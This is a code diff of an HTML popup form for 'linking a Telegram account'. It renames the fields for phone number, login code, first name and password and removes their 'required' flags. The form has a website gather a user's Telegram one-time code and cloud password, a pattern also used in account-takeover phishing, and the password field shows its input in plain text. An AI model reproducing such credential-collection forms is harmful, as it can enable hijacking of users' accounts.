@@ -100,16 +100,16 @@
         <h3 class="popupTitle">Привязка аккаунта Телеграм</h3>
         <p class="popupComment">Введите номер телефона, привязанный к аккаунту</p>
         <div class="telegramAuth _active" data-name="phone">
-            <input type="text" name="phone" class="formInput" required placeholder="89123456789">
+            <input type="text" name="tg_phone" class="formInput" placeholder="89123456789">
         </div>
         <div class="telegramAuth" data-name="code">
-            <input type="text" name="code" class="formInput" required placeholder="12345">
+            <input type="text" name="tg_code" class="formInput" placeholder="12345">
         </div>
         <div class="telegramAuth" data-name="first_name">
-            <input type="text" name="first_name" class="formInput" required placeholder="James">
+            <input type="text" name="tg_first_name" class="formInput" placeholder="James">
         </div>
         <div class="telegramAuth" data-name="password">
-            <input type="text" name="password" class="formInput" required placeholder="krutoiparol">
+            <input type="text" name="tg_password" class="formInput" placeholder="krutoiparol">
         </div>
         <button class="formBtn">Далее</button>
     </form>
